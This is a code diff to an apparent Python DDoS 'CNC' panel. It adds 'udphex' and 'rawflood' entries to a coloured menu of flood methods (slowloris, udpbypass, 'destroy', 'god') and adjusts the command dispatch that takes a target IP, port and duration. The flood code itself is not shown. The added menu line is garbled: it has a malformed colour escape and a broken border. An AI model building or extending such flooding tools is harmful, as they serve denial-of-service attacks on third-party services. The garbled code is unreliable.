@@ -193,8 +193,8 @@ def layer4():
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudpbypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mdestroy           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhome                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgod               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mslowloris           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mflux              \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstdv2               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstdv2               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<udphex>           \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m╚══   \x1b[38;2;0;255;255rawflood═════════════════════╩═════════════════════╝
 ''')
 
 def amp_games():
@@ -336,7 +336,7 @@ def main():
                 print('Usage: home <ip> <port> <packet_size> <time>')
                 print('Example: home 1.1.1.1 80 65500 60')
         
-         elif "rawflood" in cnc:
+        elif "rawflood" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
@@ -346,7 +346,6 @@ def main():
                 print('Usage: rawflood <ip> <port> <duration>')
                 print('Example: rawflood 1.1.1.1 80 60')
 
-        
         elif "udphex" in cnc:
             try:
                 ip = cnc.split()[1]
